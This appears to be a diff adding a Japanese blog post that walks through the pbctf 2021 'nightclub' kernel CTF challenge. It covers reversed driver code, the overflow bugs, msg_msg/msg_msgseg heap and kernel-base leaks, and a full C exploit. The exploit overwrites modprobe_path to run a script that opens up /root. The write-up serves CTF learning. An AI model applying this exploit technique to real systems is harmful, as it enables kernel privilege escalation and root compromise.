@@ -1,0 +1,666 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+
+<div class="keywords"><span class="btitle">keywords</span>
+<p>kernel exploit /  msg_msg /  msg_msgseg /  modprobe_path
+</p>
+</div>
+ <!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<p></p>
+<p></p>
+<p>春は曙。</p>
+<p>いつぞや開催された  <strong>pbctf 2021</strong>  のkernel問題 <strong>nightclub</strong> を解いていく。</p>
+<p>結果としては、<code>msg_msg</code>と<code>msg_msgseg</code>問題だった。</p>
+<p></p>
+<p></p>
+<h3>1: static</h3>
+<p></p>
+<h4>lysithea</h4>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">lysithea.txt</div>
+<pre class="prettyprint linenums lang-txt">
+===============================
+Drothea v1.0.0
+[.] kernel version:
+Linux version 5.14.1 (ss@ubuntu) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #4 SMP Mon Oct 4 05:54:25 PDT 2021
+[-] CONFIG_KALLSYMS_ALL is enabled.
+you mignt be able to leak info by invoking crash.
+cat: /proc/sys/kernel/unprivileged_bpf_disabled: No such file or directory
+cat: /proc/sys/vm/unprivileged_userfaultfd: No such file or directory
+[-] unprivileged userfaultfd is disabled.
+[?] KASLR seems enabled. Should turn off for debug purpose.
+Ingrid v1.0.0
+[-] userfualtfd is disabled.
+[-] CONFIG_STRICT_DEVMEM is enabled.
+===============================
+</pre>
+<p></p>
+<p>特に隙の無い設定。SMEP/SMAP/KASLR有効。</p>
+<p></p>
+<h4>reverse</h4>
+<p></p>
+<p>なぜか、ソースコードが配布されていなかった。まさか故意に添付しなかったはずがないだろうから、おそらく配布するのを忘れてしまったのだろう。おっちょこちょい。以下が全てのコードのreverse結果。</p>
+<p></p>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">reversed.c</div>
+<pre class="prettyprint linenums lang-c">
+int init_module(void)
+{
+  // register chrdev with M/m=0/0
+  major_num = __register_chrdev(0,0,0x100,&quot;nightclub&quot;,file_ops);
+  if (major_num &lt; 0) { // error
+    printk(&amp;DAT_00100558,major_num);
+    return major_num;
+  }
+  printk(&amp;DAT_00100580,major_num); // success
+  return 0;
+}
+
+struct file_operations file_ops = {
+  .read = device_read,
+  .write = device_write,
+  .open = device_open,
+  .release = device_release,
+  .compat_ioctl = device_ioctl,
+};
+
+int device_open(struct inode*, struct file*)
+{
+  device_open_count = device_open_count + 1;
+  try_module_get(__this_module);
+  return 0;
+}
+
+int device_release(struct inode*, struct file*)
+{
+  device_open_count = device_open_count + -1;
+  module_put(__this_module);
+  return 0;
+}
+
+ssize_t device_read(struct file *, char __user *, size_t, loff_t *)
+{
+  return -EINVAL;
+}
+
+ssize_t device_write(struct file *, const char __user *, size_t, loff_t *) {
+  printk(&amp;DAT_00100530);
+  return -EINVAL;
+}
+
+#define NIGHT_ADD   0xcafeb001
+#define NIGHT_DEL   0xcafeb002
+#define NIGHT_EDIT  0xcafeb003
+#define NIGHT_INFO  0xcafeb004
+
+long device_ioctl (struct file* file, unsigned int cmd, unsigned long args) {
+  switch (cmd) {
+    case NIGHT_ADD:
+      return add_chunk();
+    case NIGHT_DEL:
+      return del_chunk();
+    case NIGHT_EDIT:
+      return edit_chunk();
+    // leak diff
+    case NIGHT_INFO:
+      return edit_chunk - __kmalloc;
+    defualt:
+      return -1;
+  }
+}
+
+
+struct night {
+  night *next;
+  night *prev;
+  char unset1[0x16];
+  ulong offset;
+  char unset2[0x16];
+  uint randval;
+  char unset[0x14];
+  char unknown2[0x10];
+  char data[0x20];
+};
+
+struct userreq {
+  char unknown2[0x10];
+  char data[0x20];
+  uint target_randval;
+  uint uunknown1;
+  ulong offset;
+  uint size;
+};
+
+struct {
+  night *next;
+  night *prev;
+} master_list;
+
+uint add_chunk(userreq *arg) {
+  uint randval_ret = (uint)-1;
+  uint size;
+  night *ptr = NULL;
+  night *buf = kmem_cache_alloc_trace(XXX, 0xcc0, 0x80);
+  
+  /*
+    unknown range check operations (skip).
+  */
+  
+  buf-&gt;prev = NULL;
+  buf-&gt;next = NULL;
+  
+  _copy_from_user(&amp;buf-&gt;offset, &amp;arg-&gt;offset, 8);
+  _copy_from_user(&amp;size, &amp;arg-&gt;size, 4);
+  if ((0x20 &lt; size) || (0x10 &lt; buf-&gt;offset)) {
+    kfree(buf);
+    return -1;
+  }
+  _copy_from_user(&amp;buf-&gt;unknown2, &amp;arg-&gt;unknown2, 0x10);
+  if ((int)size &lt; 0) { while(true) {halt();}}
+  _copy_from_user(buf-&gt;data, arg-&gt;data, size);
+  buf-&gt;data[size] = &#x27;\0&#x27;; // single NULL-byte overflow
+  get_random_bytes(&amp;randval_ret, 4);
+  
+  
+  ptr = master_list-&gt;next;
+  master_list-&gt;next = buf;
+  buf-&gt;randval = randval_ret;
+  ptr-&gt;prev = buf;
+  buf-&gt;next = ptr;
+  buf-&gt;prev = (night*)master_list;
+  
+  return randval_ret;
+}
+
+long del_chunk(userreq *arg) {
+  uint target_randval, current_randval;
+  night *ptr, *next, *prev;
+  
+  _copy_from_user(&amp;target_randval, &amp;arg-&gt;target_rand, 4);
+  ptr = master_list-&gt;next;
+  
+  if (ptr != master_list) {
+    do {
+      /*
+        unknown range check operation (skip).
+      */
+      
+      next = ptr-&gt;next;
+      current_randval = ptr-&gt;randval;
+      // target night found. unlink it.
+      if (current_randval == target_randval) {
+        prev = ptr-&gt;prev;
+        next-&gt;prev = prev;
+        prev-&gt;next = next;
+        // unknown clear of pointers before kfree().
+        ptr-&gt;next = (night*)0xdead000000000100;
+        ptr-&gt;prev = (night*)0xdead000000000122;
+        kfree(ptr);
+        return 0;
+      }
+    } while (next != master_list);
+  }
+}
+
+long edit_chunk(userreq *arg) {
+  uint target_randval, current_randval, size;
+  ulong offset;
+  night *ptr;
+
+  _copy_from_user(&amp;target_randval, &amp;arg-&gt;target_rand, 4);
+  _copy_from_user(&amp;offset, &amp;arg-&gt;offset, 8);
+  if (master_list-&gt;next != master_list) {
+    ptr = master_list-&gt;next;
+    do {
+      /*
+        unknown range check operation (skip).
+      */
+      
+      current_randval = ptr-&gt;randval;
+      if (current_randval == target_randval) {
+        _copy_from_user(&amp;size, &amp;arg-&gt;size, 4);
+        if ((0x20 &lt; size) || (0x10 &lt; offset) { return -1; }
+        _copy_from_user(ptr-&gt;data + offset, arg-&gt;data, size); // heap overflow (max 0x10 bytes)
+        ptr-&gt;data[offset + size] = &#x27;\0&#x27;; // single NULL-byte overflow
+        return 0;
+      }
+      
+      ptr = ptr-&gt;next;
+    } while (ptr != master_list)
+  }
+}
+</pre>
+<p></p>
+<p>なお、上のソースコード中にも示したように、ところどころに謎のレンジチェックが入っていたが、リバースするのがしんどすぎたために無視した。(のちにわかったことだが、このモジュールを利用して<code>modprobe_path</code>に直接的に書き込むのを防ぐ効果があった。まぁ邪魔なだけだったけど)</p>
+<p></p>
+<p></p>
+<p></p>
+<h4>module abstraction</h4>
+<p></p>
+<p><code>f_ops</code>は実質的に<code>ioctl</code>のみ。</p>
+<p>上に示した<code>night</code>という構造体の<code>add</code>/<code>del</code>/<code>edit</code>ができる。この構造体は謎のパディングがところどころ入っていて気持ち悪い。<code>night</code>たちは<code>master_list</code>変数をheadとする双方向リストで管理されており、内部に<code>randval</code>というユニークなランダム値を持っていて、これを指定することで該当<code>night</code>を削除したり編集できる。</p>
+<p>最後に、<code>NIGHT_INFO</code>コマンドで<code>edit_chunk - __kmalloc</code>のdiffを教えてくれる。因みにこういう露骨なのは好きじゃない。</p>
+<p></p>
+<p></p>
+<h3>2: vulns</h3>
+<p></p>
+<h4>single NULL-byte overflow</h4>
+<p></p>
+<p><code>edit_chunk</code>及び<code>add_chunk</code>内において、以下のようなコードがある:</p>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">null-byte-overflow.c</div>
+<pre class="prettyprint linenums lang-c">
+      ptr-&gt;data[offset + size] = &#x27;\0&#x27;
+</pre>
+<p></p>
+<p><code>ptr</code>はリスト中の<code>night</code>であり、<code>data</code>は構造体の終端に位置する<code>char[0x20]</code>型変数である。<code>size</code>は<code>size &lt;= 0x20</code>という条件のため、上のコードで1バイト分だけNULLがオーバーフローする。</p>
+<p></p>
+<p></p>
+<h4>10 bytes overflow</h4>
+<p></p>
+<p>同じく<code>edit_chunk()</code>内において、更新するデータは以下のように上書きされる:</p>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">10-overflow.c</div>
+<pre class="prettyprint linenums lang-c">
+        _copy_from_user(&amp;size, &amp;arg-&gt;size, 4);
+        if ((0x20 &lt; size) || (0x10 &lt; offset) { return -1; }
+        _copy_from_user(ptr-&gt;data + offset, arg-&gt;data, size); // heap overflow (max 0x10 bytes)
+</pre>
+<p></p>
+<p><code>data</code>が<code>char[0x20]</code>であることから、0x10byte分だけ自由にoverflowできる。</p>
+<p></p>
+<p></p>
+<h4>NIGHT_INFO</h4>
+<p></p>
+<p>これはバグではないが、前述したとおり<code>edit_chunk - __kmalloc</code>を教えてくれる。これは、モジュールのアドレスさえleakできれば、このdiffを使ってkernbaseが計算できることを意味する。</p>
+<p></p>
+<p></p>
+<p></p>
+<h3>3: leak heap addr via `msg_msg` / `msg_msgseg`</h3>
+<p></p>
+<p></p>
+<h4>abstraction of heap collaption</h4>
+<p></p>
+<p>heap内でoverflowがあり、かつ双方向リストを使っているため、<code>next</code>/<code>prev</code>を書き換えるというのが基本方針。</p>
+<p>10byte overflowがあるものの、heapのアドレスがわかっていないために活用できない。まずはheapのアドレスをleakすることを目指す。</p>
+<p>まず、適当に10個くらい<code>night</code>を<code>add</code>すると、以下のようなheap layoutになる。</p>
+<p></p>
+<p></p>
+<p></p>
+<p>このとき、3の<code>night</code>でNULL-overflowをすると、4の<code>night.next</code>が<code>0xffff8880041a4780</code>から<code>0xffff8880041a4700</code>になる。つまり、2を指すようになる。</p>
+<p>その後、<code>del_chunk()</code>で3を消去し、<code>next</code>/<code>prev</code>を繋ぎ替えると、2の<code>prev</code>の値として4の<code>prev</code>の値、すなわち5のアドレスが入ることがわかる。。</p>
+<p></p>
+<p></p>
+<p></p>
+<p>ここで重要なのは、2が既に<code>free</code>されてリスト中に存在してなかったとしても<code>prev</code>の値が書き込まれるということである。つまり、2を先に<code>del</code>しておいて、ここに何らかの構造体を入れておけば、その構造体を介して<code>prev</code>の値をleakできる。</p>
+<p></p>
+<h4>utilize `msg_msgseg` to read first 10bytes</h4>
+<p></p>
+<p>さて、leakに使う構造体だが、今回は<code>night</code>の大きさが<code>0x80</code>であるため<code>msg_msg</code>を使うことにする。</p>
+<p>だが、普通に<code>msg_msg</code>ヘッダ込みで<code>0x80</code>だけ確保しようとすると、以下のようなレイアウトになってしまう。</p>
+<p></p>
+<p></p>
+<p></p>
+<p>上の図は<code>msg_msg</code>とuserデータを合わせたもので、この状態で<code>del</code>をして<code>prev</code>を書き込むと、<code>prev</code>は<code>msg_msg.m_list</code>内に書き込まれてしまう。これはユーザデータではない領域なので、<code>msgrcv()</code>で読み取ることができない。</p>
+<p></p>
+<p>ではどうすればいいかというと、これは<code>alloc_msg()</code>の実装を読めば明らかである。</p>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">ipc/msgutils.c</div>
+<pre class="prettyprint linenums lang-c">
+struct msg_msg {
+	struct list_head m_list;
+	long m_type;
+	size_t m_ts;		/* message text size */
+	struct msg_msgseg *next;
+	void *security;
+	/* the actual message follows immediately */
+};
+struct msg_msgseg {
+	struct msg_msgseg *next;
+	/* the next part of the message follows immediately */
+};
+
+#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))
+#define DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))
+
+static struct msg_msg *alloc_msg(size_t len)
+{
+	struct msg_msg *msg;
+	struct msg_msgseg **pseg;
+	size_t alen;
+
+	alen = min(len, DATALEN_MSG);
+	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
+	if (msg == NULL)
+		return NULL;
+
+	msg-&gt;next = NULL;
+	msg-&gt;security = NULL;
+
+	len -= alen;
+	pseg = &amp;msg-&gt;next;
+	while (len &gt; 0) {
+		struct msg_msgseg *seg;
+
+		cond_resched();
+
+		alen = min(len, DATALEN_SEG);
+		seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);
+		if (seg == NULL)
+			goto out_err;
+		*pseg = seg;
+		seg-&gt;next = NULL;
+		pseg = &amp;seg-&gt;next;
+		len -= alen;
+	}
+
+	return msg;
+
+out_err:
+	free_msg(msg);
+	return NULL;
+}
+</pre>
+<p></p>
+<p>この関数では、まず最初に<code>msg_msg</code>ヘッダと「いくらかの」ユーザデータ分の領域を確保したあと、残りのユーザデータがなくなるまでは<code>msg_msgseg</code>ヘッダと「いくらかの」ユーザデータ分の領域を確保し続ける。</p>
+<p>ここで「いくらかの」とは、<code>msg_msg</code>(最初の1回)の場合には<code>DATALEN_MSG</code>、<code>msg_msgseg</code>の場合には<code>DATALEN_SEG</code>である。上のdefineからもわかるとおり、1回の<code>kmalloc</code>の大きさが<code>0x1000</code>になるようになっている。</p>
+<p>よって、<code>0x80</code>分だけのメッセージを<code>msgsnd</code>する代わりに、<code>DATALEN_MSG + 0x80 - sizeof(msg_msg) - sizeof(msg_msgseg)</code>だけの大きさを持つユーザデータを送ってやれば、1つ目のユーザデータは<code>msg_msg</code>とともに<code>kmalloc-1K</code>に確保され、残りのユーザデータは<code>msg_msgseg</code>とともに<code>kmalloc-128</code>に入ってくれる。そして、<code>msg_msg</code>が0x30bytesもあるのに対して<code>msg_msgseg</code>は0x8bytesしかない。これによって、 <strong><code>msgrcv()</code>を使うと最初の8byteを除いて任意の大きさの構造体からデータを読み取ることが可能になる。</strong></p>
+<p>以上でheapbaseのlaek完了。</p>
+<p></p>
+<p></p>
+<p></p>
+<h3>4: leak module base and kernbase</h3>
+<p></p>
+<p>続いて、モジュールベースを求める。双方向リストゆえ、最新の<code>night</code>は<code>prev</code>としてヘッドの<code>master_list</code>のアドレスを保持している。これを読めれば良い。</p>
+<p>この時点でheapbaseがわかっているため、10bytes-overflowを使って<code>night</code>の<code>next/prev</code>をヒープ内の任意のアドレスに書き換えることができる。もちろんread機能はないために直接読み取ることはできないが、<code>msg_msg</code>ヘッダ内の<code>m_ts</code>を書き換えることで<code>msgrcv</code>時に読み込むサイズを任意に大きくすることができる。</p>
+<p>なお、前のヒープのleakの段階でリストが壊れているが、基本的にリストの探索はターゲットが見つかれば打ち切られるため新しい<code>night</code>を確保してそれらだけを利用すれば、特に問題はない。</p>
+<p>これで、ヒープ内を雑に読み込んで、モジュールベースのleak完了。</p>
+<p>前述したとおり、<code>edit_chunk - __kmalloc</code>がわかっているため、これでkbaseがleakできたことになる。</p>
+<p></p>
+<p></p>
+<h3>5: overwrite `modprobe_path`</h3>
+<p></p>
+<h4>unknown range check prevents overwriting...?</h4>
+<p></p>
+<p>最後に<code>modprobe_path</code>を書き換える。普通に考えると、10byte-overflowを使って<code>night.next</code>が<code>modprobe_path - x</code>を指すようにして、<code>edit_chunks()</code>で書き換えれば終わりのように思える。</p>
+<p>だが、実際に試してみると、最後の<code>edit_chunks()</code>がどうしても不正な値を返してきた。おそらくだが、最初の&quot;reversing&quot;の項で無視したレンジチェックみたいなところで、ヒープ外の値に書き込もうとするとエラーを出すようになっているぽい。詳しくは見てないから勘だけど。</p>
+<p></p>
+<p></p>
+<h4>directly overwrite heap&#x27;s next pointer</h4>
+<p></p>
+<p>少し実験した感じ、SLUBのfreelistのHARDENINGとかRANDOMIZEとかのコンフィグは有効になっていなかった(例え有効になっていても、ここまでheapを掌握していれば大丈夫なような気もするけど)。heapのnextポインタは、今回の場合offset:+0x40に置かれていた。よって、これを直接書き換えることで、次の次のkmallocの際に<code>modprobe_path</code>上にchunkを置くことができる。このchunkに入れる構造体は、やはり<code>msg_msg</code>で良い。</p>
+<p></p>
+<p></p>
+<h3>6: exploit</h3>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+#include &quot;./exploit.h&quot;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/mman.h&gt;
+
+/*********** commands ******************/
+#define DEV_PATH &quot;/dev/nightclub&quot;   // the path the device is placed
+
+#define NIGHT_ADD   0xcafeb001
+#define NIGHT_DEL   0xcafeb002
+#define NIGHT_EDIT  0xcafeb003
+#define NIGHT_INFO  0xcafeb004
+
+//#define DATALEN_MSG	((size_t)PAGESIZE-sizeof(struct msg_msg))
+#define DATALEN_MSG	((size_t)PAGE-0x30)
+#define DATALEN_SEG	((size_t)PAGE-0x8)
+
+struct night{
+  struct night *next; // double-linked list, where new node is inserted into head-&gt;next.
+  struct night *prev;
+  char unset1[0x16];
+  ulong offset;
+  char unset2[0x16];
+  uint randval;
+  char unset[0x14];
+  char unknown2[0x10];
+  char data[0x20];
+} night;
+
+struct userreq{
+  char unknown2[0x10];
+  char data[0x20];
+  uint target_randval;
+  uint uunknown1;
+  ulong offset;
+  uint size;
+};
+
+/*********** globals ******************/
+
+int night_fd = -1;
+const ulong diff_master_list_edit = 0xffffffffc0002100 - 0xffffffffc0000010;
+const ulong diff_modprobe_path = 0xffffffff8244fca0 - 0xffffffff81000000;
+
+// (END globals)
+
+long night_ioctl(ulong cmd, void *req) {
+  if (night_fd == -1) errExit(&quot;night_fd is not initialized.&quot;);
+  long ret = ioctl(night_fd, cmd, req);
+  assert(ret != -1);
+  return ret;
+}
+
+uint night_info(void) {
+  long diff = night_ioctl(NIGHT_INFO, NULL);
+  return diff;
+}
+
+uint night_add(char *buf, ulong offset, uint size) {
+  struct userreq req = {
+    .offset = offset,
+    .size = size,
+  };
+  memcpy(req.data, buf, 0x20);
+  long ret = night_ioctl(NIGHT_ADD, &amp;req);
+  assert(ret != -1);
+  return ret;
+}
+
+void night_edit(char *buf, uint target_randval, ulong offset, uint size) {
+  struct userreq req = {
+    .offset = offset,
+    .size = size,
+    .target_randval = target_randval,
+  };
+  memcpy(req.data, buf, 0x20);
+  assert(night_ioctl(NIGHT_EDIT, &amp;req) == 0);
+}
+
+void night_del(uint target_randval) {
+  struct userreq req = {
+    .target_randval = target_randval,
+  };
+  assert(night_ioctl(NIGHT_DEL, &amp;req) == 0);
+}
+
+struct msgbuf80 {
+  long mtype;
+  char mtext[0x80];
+};
+struct msgbuf80alpha {
+  long mtype;
+  char mtext[(DATALEN_MSG + 0x30) + 0x80 - 8]; // -8 is for msg_msgseg of second segment
+};
+
+int main(int argc, char *argv[]) {
+  puts(&quot;[ ] Hello, world.&quot;);
+  assert((night_fd = open(DEV_PATH, O_RDWR)) &gt; 2);
+  char *buf = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  assert(buf != MAP_FAILED);
+  memset(buf, &#x27;A&#x27;, PAGE);
+
+  // prepare for modprobe_path tech
+  system(&quot;echo -n &#x27;\xff\xff\xff\xff&#x27; &gt; /home/user/evil&quot;);
+  system(&quot;echo &#x27;#!/bin/sh\nchmod -R 777 /root\ncat /root/flag&#x27; &gt; /home/user/nirugiri&quot;);
+  system(&quot;chmod +x /home/user/nirugiri&quot;);
+  system(&quot;chmod +x /home/user/evil&quot;);
+
+  // clean kmalloc-128
+  puts(&quot;[.] cleaning heap...&quot;);
+  #define CLEAN_N 40
+  struct msgbuf80 clean_msg80 = { .mtype = 1 };
+  struct msgbuf80alpha clean_msg80alpha = { .mtype = 1 };
+  memset(clean_msg80.mtext, &#x27;X&#x27;, 0x80);
+  memset(clean_msg80alpha.mtext, &#x27;X&#x27;, sizeof(clean_msg80alpha.mtext));
+  for (int ix = 0; ix != CLEAN_N; ++ix) {
+    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+    KMALLOC(qid, clean_msg80, 1);
+  }
+
+  // get diff of __kernel and edit_chunk and __kmalloc
+  uint edit_kmalloc_diff = night_info();
+  printf(&quot;[+] edit_chunk - __kmalloc: 0x%x\n&quot;, edit_kmalloc_diff);
+
+  // add first chunks
+  #define FIRST_N 10
+  uint randvals[FIRST_N] = {0};
+  printf(&quot;[.] allocating first chunks (%d)\n&quot;, FIRST_N);
+  for (int ix = 0; ix != FIRST_N; ++ix) {
+    randvals[ix] = night_add(buf, 0, 0x1F);
+    printf(&quot;[.] alloced randval: %x\n&quot;, randvals[ix]);
+  }
+
+  // single NULL-byte overflow into night[6]-&gt;next
+  night_edit(buf, randvals[5], 0, 0x20);
+
+  night_del(randvals[4]);
+  // allocate msg_msgseg + userdata at &amp;night[4]
+  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+  KMALLOC(qid, clean_msg80alpha, 1);
+  // make night[2]-&gt;prev point to &amp;night[4]
+  night_del(randvals[6]);
+  // leak heap addr via msg_msgseg
+  ssize_t n_rcv = msgrcv(qid, &amp;clean_msg80alpha, sizeof(clean_msg80alpha.mtext) - 0x30, clean_msg80alpha.mtype, 0);
+  printf(&quot;[+] received 0x%x size of message.\n&quot;, n_rcv);
+  ulong leaked_heap = *(ulong*)(clean_msg80alpha.mtext + DATALEN_MSG);
+  ulong heap_base = leaked_heap - 0x380;
+  printf(&quot;[!] leaked heap: 0x%lx\n&quot;, leaked_heap);
+  printf(&quot;[!] heapbase: 0x%lx\n&quot;, heap_base);
+
+
+  /** overwrite next pointer, edit msg_msg&#x27;s size, read heap sequentially, leak master_list. **/
+
+  // heap is tampered, allocate fresh nights.
+  #define SECOND_N 6
+  uint randvals2[SECOND_N] = {0};
+  for (int ix = 0; ix != SECOND_N; ++ix) {
+    randvals2[ix] = night_add(buf, 0, 0x20);
+  }
+
+  // allocate simple msg_msg + userdata
+  memset(clean_msg80.mtext, &#x27;Y&#x27;, 0x50);
+  KMALLOC(qid, clean_msg80, 1);
+
+  // overflow to overwrite night[1]-&gt;next to allocated msg_msg
+  printf(&quot;[+] overwrite next target with 0x%lx\n&quot;, heap_base+ 0x700 + 0x10 - 0x60);
+  *(ulong*)(buf + 0x10) = heap_base + 0x700 + 0x10 - 0x60;
+  night_edit(buf, randvals2[3], 0x10, 0x20);
+
+  // edit to overwrite msg_msg.m_ts with huge value
+  ulong val[0x2];
+  val[0] = 1;
+  val[1] = 0x200; // m_ts
+  night_edit((char*)val, 0x41414141, 0, 0x10);
+
+  // allocate new night and read master_list
+  night_add(buf, 0, 0);
+  n_rcv = msgrcv(qid, &amp;clean_msg80, 0x500, clean_msg80alpha.mtype, 0);
+  printf(&quot;[+] received 0x%x size of message.\n&quot;, n_rcv);
+  ulong master_list = *(ulong*)(clean_msg80.mtext + 0xb * 8);
+  ulong edit_chunk = master_list - diff_master_list_edit;
+  ulong __kmalloc = edit_chunk - edit_kmalloc_diff;
+  ulong kbase = __kmalloc - 0x1caa50;
+  ulong modprobe_path = kbase + diff_modprobe_path;
+  printf(&quot;[!] master_list: 0x%lx\n&quot;, master_list);
+  printf(&quot;[!] edit_chunk: 0x%lx\n&quot;, edit_chunk);
+  printf(&quot;[!] __kmalloc: 0x%lx\n&quot;, __kmalloc);
+  printf(&quot;[!] kbase: 0x%lx\n&quot;, kbase);
+  printf(&quot;[!] modprobe_path: 0x%lx\n&quot;, modprobe_path);
+
+  /** overwrite modprobe_path **/
+  strcpy(clean_msg80.mtext, &quot;/home/user/nirugiri\x00&quot;);
+
+  // heap is collapsed, allocate fresh nights.
+  #define THIRD_N 2
+  uint randvals3[THIRD_N] = {0};
+  for (int ix = 0; ix != THIRD_N; ++ix) {
+    randvals3[ix] = night_add(buf, 0, 0x20);
+  }
+
+  // overwrite night&#x27;s next ptr
+  printf(&quot;[+] overwrite next target with 0x%lx\n&quot;, heap_base + 0x8c0 - 0x60);
+  *(ulong*)(buf + 0x10) = heap_base + 0x8c0 - 0x60; // heap&#x27;s next ptr is placed at +0x40 of chunk.
+  night_edit(buf, randvals3[0], 0x10, 0x20);
+
+  // edit to overwrite heap&#x27;s next pointer
+  val[0] = modprobe_path - 0xa0 + 0x80 - 0x10;
+  val[1] = 0x0;
+  night_edit((char*)val, 0x0, 0, 0x10);
+
+  // overwrite modprobe_path
+  night_add(buf, 0, 0);
+  puts(&quot;[+] allocating msg_msg on modprobe_path.&quot;);
+  qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+  KMALLOC(qid, clean_msg80, 1);
+
+  // invoke evil script
+  puts(&quot;[!] invoking evil script...&quot;);
+  system(&quot;/home/user/evil&quot;);
+
+  // end of life
+  puts(&quot;[ ] END of life...&quot;);
+}
+</pre>
+<p></p>
+<p></p>
+<h3>7: アウトロ</h3>
+<p></p>
+<p></p>
+<p></p>
+<p><code>msg_msg</code>はread/writeに関して言えばかなり万能でいいですね。 <strong>とりわけ<code>msg_msgseg</code>と組み合わせることで、0x8 ~ 0x1000 bytes までの任意のサイズに対してread/writeができるのが強いです。</strong></p>
+<p></p>
+<p>この問題自体は、問題が少しわざとらしかったり、構造体にパディングが多くあからさまだったり、そして何よりソースコードの配布を「おっちょこちょい」で忘れてしまってたりと荒削りなところも合ったけど、<code>msg_msg</code>の汎用性の再確認ができる言い問題だったと思います。</p>
+<p></p>
+<p></p>
+<p>次回、池の水全部飲んでみたでお会いしましょう。</p>
+<p></p>
+<p></p>
+<p>続く。</p>
+<p></p>
+<p></p>
+<h3>8: 参考</h3>
+<p>1: </p>
+<p><a href='msg_msg primitive'>msg_msg primitive</a></p>
+<p>2: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</p>
+<p><a href='other example of msg_msg'>other example of msg_msg</a></p>
+<p>3: https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</p>
+<p><a href='other writeup for this chall'>other writeup for this chall</a></p>
+<p>4: https://www.willsroot.io/2021/10/pbctf-2021-nightclub-writeup-more-fun.html</p>
+<p><a href='other writeup for this chall'>other writeup for this chall</a></p>
+<p>5: https://kileak.github.io/ctf/2021/pb21-nightclub/</p>
+<p><a href='useful structures'>useful structures</a></p>
+<p>6: https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628</p>
+<p><a href='ニルギリ'>ニルギリ</a></p>
+<p>7: https://youtu.be/yvUvamhYPHw</p>
+<p><a href=''></a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
